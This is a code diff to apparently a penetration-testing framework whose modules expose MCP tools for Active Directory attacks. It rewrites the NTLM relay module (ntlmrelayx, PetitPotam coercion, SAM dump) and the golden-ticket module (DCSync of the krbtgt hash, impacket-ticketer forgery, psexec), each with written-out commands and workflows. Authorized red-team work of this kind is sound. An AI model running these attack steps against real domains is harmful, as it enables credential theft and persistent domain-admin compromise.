@@ -82,25 +82,30 @@ class ResponderRelay(AttackModule):
     required_cves: list[str] = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Wraps the responder_relay MCP tool. Relay targets are built ONLY from the allowlist (+ runtime target); off-list hosts are refused.",
-            "workflow": [
-                "1. Confirm the target does not require SMB signing (call smb_signing_check); signing-required hosts cannot be relayed to.",
-                f"2. Call responder_relay(target_ip='{ctx.target_ip}', iface=<op_iface>) to start ntlmrelayx bound to the operator interface.",
-                "3. Coerce an authentication to your listener (e.g. via a coerced HTTP/PetitPotam request from the owned target).",
-                "4. ntlmrelayx dumps SAM / executes the optional command against an allowlisted relay target only.",
-            ],
-            "suggested_command": (
-                f"ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'  # targets.txt built from allowlist + {ctx.target_ip}"
+        return self._info_result(
+            ctx,
+            note=(
+                "Wraps the responder_relay MCP tool. Relay targets are built ONLY "
+                "from the allowlist (+ runtime target); off-list hosts are refused. "
+                "Linux-attacker only (ntlmrelayx); poisoning (responder) is a "
+                "separate operator step, not provided as an MCP tool."
             ),
-            "prerequisites": ["SMB signing disabled on the relay target", "a coerced auth to the operator listener"],
-            "references": [
+            evidence=[f"NTLM relay planned against {ctx.target_ip} (signing state unverified)"],
+            references=[
                 "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
                 "https://www.thehacker.recipes/a-d/movement/ntlm/relay",
             ],
-        }
+            suggested_command=(
+                f"ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'  # targets.txt built from allowlist + {ctx.target_ip}"
+            ),
+            prerequisites=["SMB signing disabled on the relay target", "a coerced auth to the operator listener"],
+            workflow=[
+                "0. Run smb_signing_check on each allowlisted relay candidate; drop signing-required hosts.",
+                f"1. Call responder_relay(target_ip='{ctx.target_ip}', iface=<op_iface>) to start ntlmrelayx bound to the operator interface.",
+                "2. Coerce an authentication to your listener (e.g. via a coerced HTTP/PetitPotam request from the owned target).",
+                "3. ntlmrelayx dumps SAM (no -c) or executes the command (-c) against an allowlisted relay target only.",
+            ],
+        )
 
 
 class GoldenTicket(AttackModule):
@@ -111,26 +116,32 @@ class GoldenTicket(AttackModule):
     required_cves: list[str] = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Wraps the golden_ticket MCP tool (impacket-ticketer). Requires the krbtgt NTLM hash + domain SID (recovered via DCSync).",
-            "workflow": [
-                "1. Obtain the krbtgt NTLM hash and the domain SID (call dump_credentials(method='dcsync', target_user='krbtgt') against the owned DC).",
+        return self._info_result(
+            ctx,
+            note=(
+                "Wraps the golden_ticket MCP tool (impacket-ticketer). Requires "
+                "the krbtgt NTLM hash + domain SID (recovered via DCSync). A "
+                "golden ticket IS domain admin -- any username works (even "
+                "non-existent) because the TGT is forged."
+            ),
+            evidence=[f"golden ticket minting planned against {ctx.target_ip} (krbtgt hash required)"],
+            references=[
+                "https://github.com/fortra/impacket/blob/master/examples/ticketer.py",
+                "https://adsecurity.org/?p=1729",
+            ],
+            suggested_command=(
+                f"impacket-ticketer -nthash <krbtgt_nt> -domain DOMAIN -domain-sid S-1-5-... "
+                f"-user Administrator -duration 10d Administrator  # then psexec -k {ctx.target_ip}"
+            ),
+            prerequisites=["krbtgt NTLM hash (via DCSync)", "domain SID"],
+            privilege_level="admin",
+            workflow=[
+                "1. Obtain the krbtgt NTLM hash + domain SID: dump_credentials(method='dcsync', target_user='krbtgt') against the owned DC; parse S-1-5-21-... from the secretsdump output.",
                 f"2. Call golden_ticket(target_ip='{ctx.target_ip}', domain=<d>, username=<any_user>, krbtgt_hash=<nt>, sid=<domain_sid>) to mint the TGT.",
                 "3. export KRB5CCNAME=<ccache> and use the ticket with impacket-psexec -k -no-pass against the owned target only.",
                 "4. The ticket persists domain access until the krbtgt password is rotated (twice).",
             ],
-            "suggested_command": (
-                f"impacket-ticketer -nthash <krbtgt_nt> -domain DOMAIN -domain-sid S-1-5-... "
-                f"-user Administrator -duration 10d Administrator  # then psexec -k {ctx.target_ip}"
-            ),
-            "prerequisites": ["krbtgt NTLM hash (via DCSync)", "domain SID"],
-            "references": [
-                "https://github.com/fortra/impacket/blob/master/examples/ticketer.py",
-                "https://adsecurity.org/?p=1729",
-            ],
-        }
+        )
 
 
 class SMBSigningCheck(AttackModule):
